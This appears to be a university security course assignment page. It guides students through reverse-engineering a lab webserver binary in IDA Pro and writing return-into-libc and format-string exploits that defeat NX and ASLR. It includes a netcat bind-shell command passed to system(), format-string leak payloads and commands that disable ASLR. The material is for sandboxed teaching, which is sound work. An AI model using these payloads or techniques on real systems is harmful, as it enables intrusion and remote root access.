<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="application/xhtml+xml;charset=utf-8" />
<link rel="stylesheet" href="/css/old-teaching.css" type="text/css" />
<title>Project 2</title>
</head>
<body>

<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-34500030-2', 'auto');
ga('send', 'pageview');
</script>


<div id="layout-content">
<div id="toptitle">
<div id="title">Project 2</div>
</div>
<p><b>Due:</b> Thursday, October 30, 2014, 23:59<br /></p>
<h2>Goal</h2>
<p>Unlike the previous project where you were given access to the source
code of the target programs, for this project, you will have to find
the vulnerabilities using only the binary, IDA Pro, and gdb.</p>
<p>All work in this project must be done on the VirtualBox virtual machine
provided on the course website; see below for information about this
environment.</p>
<p>You are given a single <tt>server</tt> binary which is a very simple
webserver. The <tt>server</tt> program takes an optional argument specifying
the port it listens to. It defaults to port 80 which requires root
privileges:</p>
<div class="codeblock">
<div class="blockcontent"><pre>
user@sandbox:~/project2$ cd webroot
user@sandbox:~/project2/webroot$ sudo ./server # Or
user@sandbox:~/project2/webroot$ ./server 8080
</pre></div></div>
<p>Your goal is to write two exploit programs: <tt>sploit1</tt> and <tt>sploit2</tt> to
get a <i>remote</i> shell from the webserver.</p>
<ul>
<li><p>For <tt>sploit1</tt>, you will modify the environment (described
below) to disable executing code on the stack.</p>
</li>
<li><p>For <tt>sploit2</tt>, you will modify the environment again (also
described below) to enable address space layout randomization
(ASLR).</p>
</li>
</ul>
<p>For both exploit programs, you should ensure that your attack works
both when the server is launched as <tt>sudo ./server</tt> and as <tt>./server
8080</tt> from inside the <tt>project2/webroot</tt> directory.</p>
<p>Some sample code is provided in the form of <tt>fetchfile.c</tt> which, when
compiled and run as <tt>./fetchfile localhost 8080 /index.html</tt>, for
example, will connect to the webserver and download the file
index.html, displaying the raw server output to <tt>stdout</tt>.</p>
<p>Both of your exploit programs are expected to run from inside the VM
(so that we have a consistent environment to test). This is most
easily accomplished by configuring VirtualBox to forward a port so
that you can ssh into the VM. Directions are given below.</p>
<h2>The Environment</h2>
<p>You (and we, for grading) will test your exploit programs within a
VirtualBox virtual machine. To use this VM on your personal computer
(Windows, Mac OS X, and Linux are supported), you will need to
download the virtual machine image provided on the course
website&#8201;&mdash;&#8201;sandbox-1.1.ova&#8201;&mdash;&#8201;as well as
VirtualBox from the <a href="https://www.virtualbox.org/wiki/Downloads">VirtualBox website</a>. <b>This is the same virtual machine image you used
in the previous project. If you still have it, you do not need to
download it again.</b></p>
<p>We have also arranged for VirtualBox to be installed on the Windows
machines in Maryland 310.</p>
<h2>Preliminaries</h2>
<p>1. Get the sandbox virtual machine (the same one we used for project 1).</p>
<p>2. Turn on PAE/NX by shutting down the virtual machine and going to
Settings &gt; System &gt; Processor and clicking &ldquo;Enable PAE/NX&rdquo;.</p>
<p>3. Go to Settings &gt; Network &gt; Adapter 1 &gt; Port Forwarding and forward
a port from the host machine to port 22 in the guest:</p>
<table class="imgtable"><tr><td>
<img src="portforwarding.png" alt="Port Forwarding" />&nbsp;</td>
<td align="left"></td></tr></table>
<p>4. Download and unpack project2.</p>
<div class="codeblock">
<div class="blockcontent"><pre>
user@sandbox:~$ wget http://www.cs.jhu.edu/~s/teaching/cs460/2014-fall/project2.tar.gz
user@sandbox:~$ tar zxf project2.tar.gz
</pre></div></div>
<h2>Getting started</h2>
<p>1. Open the server binary in IDA.</p>
<table class="imgtable"><tr><td>
<img src="load.png" alt="Loading the binary in IDA Pro" />&nbsp;</td>
<td align="left"></td></tr></table>
<p>2. With the main window selected, press spacebar to toggle between
graph view and linear view.</p>
<p>3. In the <tt>Functions window</tt>, double clicking on the name of a
function jumps the main window to that function.</p>
<p>4. Double click on <tt>start</tt> to move to the <tt>start</tt> function.</p>
<table class="imgtable"><tr><td>
<img src="start.png" alt="The start function" />&nbsp;</td>
<td align="left"></td></tr></table>
<p>5. The first argument to <tt>__libc_start_main</tt> is the main function.</p>
<p>6. Select <tt>sub_8049DCB</tt> by clicking on it. Let's name it <tt>main</tt> by
pressing <tt>n</tt> to rename it.</p>
<p>7. This has updated our functions list in the <tt>Functions window</tt>.
Examine the main function by double clicking on its name, either in
the Functions window or in the assembly listing.</p>
<p>8. If you are not currently in the graph view, press the spacebar to
enter it. Scroll around the control flow graph either by clicking and
dragging in the graph overview window or in the space between
functions in the main window. The colored arrows have the following
meanings:</p>
<ul>
<li><p>Blue: unconditional jump</p>
</li>
<li><p>Green: conditional jump taken</p>
</li>
<li><p>Red: conditional jump not taken</p>
</li>
</ul>
<p>9. Let's take a look at the code surrounding the call to <tt>_socket</tt>.</p>
<table class="imgtable"><tr><td>
<img src="socket.png" alt="The socket call" />&nbsp;</td>
<td align="left"></td></tr></table>
<p>We can immediately see that the assembly was produced from code
similar to the following:</p>
<div class="codeblock">
<div class="blockcontent"><pre>
sock = socket(2, 1, 0);
if (sock == -1)
{
	perror("sock = socket(PF_INET, SOCK_STREAM, 0)");
	exit(1);
}
</pre></div></div>
<p>Notice that the error message contains the symbolic constants used
although the code only contains the numeric values.</p>
<p>10. If we are so inclined, we can have IDA replace the numeric values
with the constants. First, select the <tt>domain</tt> parameter, 2, by
clicking on it. Right clicking opens a contextual menu. Select
&ldquo;Use standard symbolic constant&rdquo; and then select <tt>PF_INET</tt> from
the list. Similarly, select <tt>SOCK_STREAM</tt> for the <tt>type</tt>
parameter. In general, we won't have error messages that tell us
what the constants we want are. In that case, we can look through
the manual page for a given function to see in which system header
file it is defined and then look through the header file to find
the value of the constant. IDA does a good job of only suggesting
constants with the appropriate numerical value, most of the time.</p>
<p>11. Identify the loop in the main function. Loops can easily be
identified in the graph view by arrows that point toward earlier
blocks of code. Clicking on a jump target will also highlight the
label.</p>
<p>In addition to calling standard library functions, each pass
through the loop calls a function in the server binary. Since this
is a webserver, we can surmise that this function is responsible
for handling web clients (i.e., browsers). Rename this function
from <tt>sub_&hellip;</tt> to <tt>handle_client</tt> the same way we did with <tt>main</tt>.</p>
<p>12. Let's identify the two arguments to <tt>handle_client</tt>. Start by selecting
<tt>ebx</tt> in the <tt>mov [esp], ebx</tt> instruction just before call
<tt>handle_client</tt>. All instances of <tt>ebx</tt> are highlighted in the
assembly. Looking up the code, we see that <tt>ebx</tt> is set most
recently by the return value of the accept function. By checking
the manual page for accept, we see that it returns a file
descriptor (an integer) corresponding to the newly opened socket.
So the first argument to <tt>handle_client</tt> is the socket, which makes
sense.</p>
<p>The second argument to <tt>handle_client</tt>, which is passed in <tt>[esp+4]</tt>,
comes from <tt>esi</tt>. By selecting <tt>esi</tt>, we see that it is used in several
places but it is only assigned once via the <tt>lea</tt> instruction
following the call to <tt>listen</tt>. <tt>esi</tt> is set to an address on the stack,
namely <tt>esp+28h</tt>. We see that this address is passed as the <tt>buf</tt>
argument to <tt>inet_ntop</tt>. The manual page reveals that <tt>inet_ntop</tt> writes
a string containing the address to the <tt>buf</tt> argument.</p>
<p>Slightly more cryptically, but if <tt>inet_ntop</tt> does not return 0, then
the 4&nbsp;byte word <tt>0x0000002D</tt> is written to the first word of <tt>buf</tt>.
Recall that x86 is little endian so this is stored as <tt>0x2D</tt>, <tt>0x00</tt>,
<tt>0x00</tt>, <tt>0x00</tt> in memory. By selecting the <tt>2Dh</tt> and pressing <tt>r</tt>, we see
that <tt>0x2D</tt> is the hyphen character &lsquo;-&rsquo;. Thus if <tt>inet_ntop</tt> does not
return 0, then the address is set to be <tt>&ldquo;-&rdquo;</tt>.</p>
<p>13. Finally, double click on handle_client. At the beginning of the
function, IDA has declared a bunch of symbols like <tt>var_1120</tt>. These
are what IDA thinks are local variables on the stack. Some of them
have names already corresponding to arguments of standard library
functions that IDA knows about. We can change these names as we see
fit.</p>
<p>In addition to local variables, IDA can deduce information about
function arguments. In particular, it knows that handle_client takes
two arguments, but it thinks both are ints. We can change this by
selecting handle_client and pressing <tt>y</tt> and giving <tt>handle_client</tt>
the prototype:</p>
<div class="codeblock">
<div class="blockcontent"><pre>
void handle_client(int sock, const char *address)
</pre></div></div>
<p>After doing this, notice that the arguments have been named sock and
address, similar to the local variables.</p>
<h2>Finding a vulnerability</h2>
<p>We could, if we wanted, spend a lot of time working out how each
function works but our goal is not to understand the complete inner
workings of the program. Rather, our goal is to find a way to exploit
it.</p>
<p>1. Let's begin by finding usage of functions which are prone to
errors. Let's start by finding all instances of <tt>strcpy</tt>. In the
<tt>Functions window</tt>, double click on <tt>_strcpy</tt>. (As an aside, what IDA
calls <tt>_strcpy</tt> is what gdb calls <tt>strcpy@plt</tt>. We'll come back to this
later.) If you are in &ldquo;graph view,&rdquo; press the spacebar to return to
&ldquo;text view.&rdquo; From the comment <tt>CODE XREF: sub_8049214+33</tt>, we can
see that <tt>strcpy</tt> is called from exactly one location.</p>
<table class="imgtable"><tr><td>
<img src="strcpy.png" alt="strcpy" />&nbsp;</td>
<td align="left"></td></tr></table>
<p>2. Double click on <tt>sub_8049214</tt> to be taken to that function. We can
see that the destination argument to <tt>strcpy</tt> comes from the return
value of <tt>sub_8048EF9</tt> and by tracing the source argument back, we see
that it is the first (and only) argument to <tt>sub_8049214</tt>.</p>
<p>3. Examine function <tt>sub_8048EF9</tt>. From a quick inspection, it should be
clear that this function calls <tt>malloc</tt>, passing its only argument and
then asserts that the returned value is not <tt>NULL</tt>. From the argument to
the <tt>__assert_fail</tt> function, we can see that <tt>sub_8048EF9</tt> is actually
named xmalloc. Rename <tt>sub_8048EF9</tt> to <tt>xmalloc</tt>. This way, if we see it
again, we'll immediately remember what it does.</p>
<p>4. Go back to <tt>sub_8049214</tt> (by pressing <tt>esc</tt> or by hitting the back
arrow in the toolbar). At this point, it's clear that the function
argument is a string that gets copied to some memory allocated on the
heap. Furthermore, we can tell that a pointer to this memory is
returned. All that remains is to figure out if it's allocating enough
memory to hold the entire string. The few instructions before and
after the <tt>repne scasb</tt> are actually computing the length of the string
plus 1 and passing that to <tt>malloc</tt>. To see that, look up the definition of
<tt>scasb</tt>, <tt>repne</tt>, and <tt>not</tt> and recall that integers are stored in twos
complement.</p>
<p>Since enough space is allocated to hold the contents of the string
and <tt>malloc</tt> is asserted to not return <tt>NULL</tt>, this <tt>strcpy</tt> does
not appear to be exploitable.</p>
<p>5. It's worth noting that this function behaves very similar to the
standard library function <tt>strdup</tt> in that it takes a string as an
argument and then creates a copy of it, returning the copy. Rename the
function <tt>xstrdup</tt> (in analogy with <tt>xmalloc</tt>).</p>
<p>6. Follow the same procedures to check for the presence of other
potentially exploitable functions such as <tt>memcpy</tt> or <tt>strcat</tt>. By default
IDA only displays 2 cross references. It's helpful to increase this
number. Look in Options &gt; General&hellip; &gt; Cross-references and increase
the number of displayed xrefs to 200. This should be far more than we
need.</p>
<p>7. You should be able to find several buffer overflows on the stack.
Which functions have overflows and what input do we need to send over
the socket to trigger them?</p>
<p>Since the stack is not executable, we are not able to inject code
onto the stack. We will need to try something else.</p>
<h2>Writing the first exploit</h2>
<p>We're going to perform a return-into-libc attack by smashing the stack
in one of the error handling functions. From the last section, you
should have discovered a buffer overflow on the stack when handling an
incorrect HTTP version (as well as a few other places). </p>
<p>1. Run</p>
<div class="codeblock">
<div class="blockcontent"><pre>
$ sudo sh -c 'echo 0 &gt; /proc/sys/kernel/randomize_va_space'
</pre></div></div>
<p>This VM is configured to have ASLR enabled by default.
This command will disable ASLR until either you restart the VM or
you write 2 to <tt>/proc/sys/kernel/randomize_va_space</tt>.</p>
<p>2. Make a copy of <tt>fetchfile.c</tt> and name it <tt>sploit1.c</tt>.</p>
<p>3. A valid HTTP request line looks like:</p>
<div class="codeblock">
<div class="blockcontent"><pre>
GET /path/to/file HTTP/1.1
</pre></div></div>
<p>Modify <tt>sploit1.c</tt> to hard code a request for an arbitrary file (you can
use &ldquo;/&rdquo; for the file, if you'd like) and a short, invalid HTTP version
string. When the program is run, what is the result? What about a
long, invalid HTTP version string?</p>
<p>4. Compute the distance on the stack from the saved instruction
pointer to the location where the version is written to the stack.
This can be computed directly from the disassembly or you can use gdb.</p>
<p>5. Produce a request string that overwrites the saved <tt>eip</tt> on the stack
with an arbitrary value.</p>
<p>6. Find the address of the exit function in libc (gdb works nicely
here) and craft input that will overwrite the saved <tt>eip</tt> with that
address.</p>
<p>7. When you run the exploit, the server will likely crash before it
returns to exit. Look carefully at the what happens after you
overwrite the saved <tt>eip</tt>. In particular, some other values that are
subsequently used as pointers are overwritten as well. Modify your
exploit to overwrite those values with valid addresses. Addresses on
the stack work very well.</p>
<p>8. Find the address of the system function in libc. Modify the exploit
such that instead of returning to exit, it returns to <tt>system</tt>. The
argument to system should be a pointer to a string that contains:</p>
<div class="codeblock">
<div class="blockcontent"><pre>
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc -l localhost 1234 &gt;/tmp/f;rm -f /tmp/f
</pre></div></div>
<p>This rather cryptic command can be understood by writing it in a more familiar format:</p>
<div class="codeblock">
<div class="blockcontent"><pre>
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l localhost 1234 &gt; /tmp/f
rm -f /tmp/f
</pre></div></div>
<p>The <tt>mkfifo</tt> command makes a named pipe into which the <tt>nc</tt> command
will write its output and from which <tt>sh</tt> will read its input.
If you're not familiar with the netcat tool, read the man page. What
this particular command will do is it will listen on port 1234 and on
a connection, it will launch <tt>sh</tt>.</p>
<p>Since you don't know exactly where on the stack this string will
live, you can prepend it with a large number of spaces, similar to
a <tt>nop</tt> sled. Take care that any text after the string is ignored.</p>
<p>After <tt>sploit1</tt> sends the exploit string to the server, it should close
the socket, sleep for a second (just to give the server process time
to run and launch <tt>nc</tt>), and finally execute <tt>nc</tt>. The last 5 lines of my
<tt>sploit1</tt>'s main function are</p>
<div class="codeblock">
<div class="blockcontent"><pre>
	sendn(sock, request, strlen(request));
	close(sock);
	sleep(1);
	execl("/bin/nc", "/bin/nc", argv[1], "1234", NULL);
	_exit(1);
</pre></div></div>
<p>If the server is launched as root,</p>
<div class="codeblock">
<div class="blockcontent"><pre>
$ sudo ./server
</pre></div></div>
<p>then when I run <tt>sploit1</tt>, a prompt is printed, and I can run shell
commands and the response will be sent back:</p>
<div class="codeblock">
<div class="blockcontent"><pre>
$ ./sploit1 localhost 80
# whoami
root
# exit
</pre></div></div>
<p>Your <tt>sploit1</tt> should behave the same way.</p>
<h2>Writing the second exploit</h2>
<p>For the second exploit, the goal is the same (get a remote shell) but
we're going to turn on address space layout randomization (ASLR).</p>
<p>1. Run</p>
<div class="codeblock">
<div class="blockcontent"><pre>
$ sudo sh -c 'echo 2 &gt; /proc/sys/kernel/randomize_va_space'
</pre></div></div>
<p>This will reenable ASLR if you have not restarted the VM since you
disabled it for sploit&nbsp;1.</p>
<p>Now, if we run the server and <tt>sploit1</tt>, the server will crash because
we relied on the address of system and the address of our string on
the stack. We're going to need to perform an address disclosure attack
to learn where the stack is and where libc is loaded.</p>
<p>2. Examine the four calls to <tt>snprintf</tt> in IDA, three of them have
constant format strings, one does not. Start the server in gdb. Set a
breakpoint just prior to the call to the <tt>snprintf</tt> that does not have a
constant format string and use gdb to print the format string.</p>
<p>3. Use <tt>fetchfile</tt> to provide input which can be used for the format
string. Try giving it file paths of the form: <tt>ZZZZ%1$08x-%2$08x-%3$08x</tt>
and then change the 1, 2, and 3 to 4, 5, and 6 and so on until you
find the value <tt>ZZZZ</tt>. You'll be able to see the output by watching
<tt>stdout</tt> of server. Naturally, this information won't be available to a
real client, but we will deal with that later.</p>
<p>4. Double clicking on <tt>_snprintf</tt> in IDA shows the implementation in the
plt section:</p>
<div class="codeblock">
<div class="blockcontent"><pre>
jmp	ds:off_804B7E4
</pre></div></div>
<p>Although it may not be obvious, this is actually an indirect jump to
an absolute address. That is, address <tt>0x0804b7e4</tt> contains a pointer to
the actual <tt>snprintf</tt> function which is set by the dynamic linker after
<tt>snprintf</tt> is called for the first time.</p>
<p>5. Copy <tt>fetchfile.c</tt> to <tt>sploit2.c</tt>. Modify <tt>sploit2.c</tt> so that it tries to
fetch a file that contains a format string exploit. This time, instead
of <tt>ZZZZ%n$08x</tt> for some value of n, replace the <tt>ZZZZ</tt> with the address
<tt>0x0804b7e4</tt> (in little endian) and replace the <tt>08x</tt> with <tt>s</tt>. This should
cause the server to treat that address as a pointer to a string and print
the string. The first four bytes of which should be the address of
<tt>snprintf</tt>.</p>
<p>6. Now modify the file string to <tt>addr%m$08x%n$s</tt> where addr and n are
the values from step 5 and m is chosen such that it prints out the
saved frame pointer (<tt>ebp</tt>) in hex. Hint: rather than just trying
value after value like we did to find the <tt>ZZZZ</tt>, look at the <tt>lea</tt>
instruction just above the call to <tt>_snprintf</tt> to find the start of
the buffer.</p>
<p>7. In addition to writing the connection information to <tt>stdout</tt>, the
server logs the same information to <tt>server.log</tt>. Since this is written
in the same directory as server, we can fetch it using a normal HTTP
GET.</p>
<p>Change <tt>sploit2.c</tt> to make two requests. The first exploits the format
string vulnerability to write the address of the saved <tt>ebp</tt> in hex and
the address of <tt>snprintf</tt> to <tt>server.log</tt> and the second fetches
<tt>/server.log</tt>.</p>
<p>8. Read the fetched <tt>server.log</tt> line by line until you get to the end.
Hint: Using code like</p>
<div class="codeblock">
<div class="blockcontent"><pre>
	FILE *fp = fdopen(sock, "r");
	char line[2][1024];
	int which = 0;
	while (!feof(fp) &amp;&amp; !ferror(fp) &amp;&amp; fgets(line[which], 1024, fp))
		which = !which;
	which = !which;
	fclose(fp);
</pre></div></div>
<p>puts the final line read from the socket in <tt>line[which]</tt>.</p>
<p>9. Parse the 8 byte hex string that is the saved frame pointer and the
4 byte integer that is the address of <tt>snprintf</tt> out of the last line
read from the socket.</p>
<p>10. Add your exploit from <tt>sploit1.c</tt> to <tt>sploit2.c</tt> but make sure you
adjust the address of <tt>system</tt>, <tt>exit</tt>, and the pointers to the stack
appropriately. Now that you know a stack address, you can compute
exactly which address the argument to system should be. Remove the
&ldquo;space sled&rdquo; that we used for <tt>sploit1</tt> since it is unnecessary.</p>
<p>11. You should now be able to start the server as root and get a
remote, root shell by running <tt>sploit2</tt> even though the process is
protected by ASLR! Congratulations!</p>
<h2>Deliverables</h2>
<p>You are to provide a tarball (i.e., a <tt>.tar.gz</tt> or <tt>.tar.bz2</tt> file)
containing <tt>sploit1.c</tt> and <tt>sploit2.c</tt>:</p>
<div class="codeblock">
<div class="blockcontent"><pre>
user@sandbox:~/project2$ tar zcf p2.tar.gz sploit1.c sploit2.c
</pre></div></div>
<p>We should be able to build and run your exploits without error or
warning by running:</p>
<div class="codeblock">
<div class="blockcontent"><pre>
user@sandbox:~/project2$ tar zxf p2.tar.gz
user@sandbox:~/project2$ gcc -Wall -Werror -std=c99 -o sploit1 sploit1.c
user@sandbox:~/project2$ ./sploit1 localhost 80
user@sandbox:~/project2$ gcc -Wall -Werror -std=c99 -o sploit2 sploit2.c
user@sandbox:~/project2$ ./sploit2 localhost 80
</pre></div></div>
<p>(Of course, <tt>sploit1</tt> will not work with ASLR enabled.)</p>
<h2>Hint</h2>
<p>One of the functions you want to return to has an address that ends
in <tt>0x00</tt>. Try looking backward several bytes from the start of the
function to see if you can return there instead.</p>
<div id="footer">
<div id="footer-text">
Last updated 2016-06-28 11:50:21 CDT.
</div>
</div>
</div>
</body>
</html>
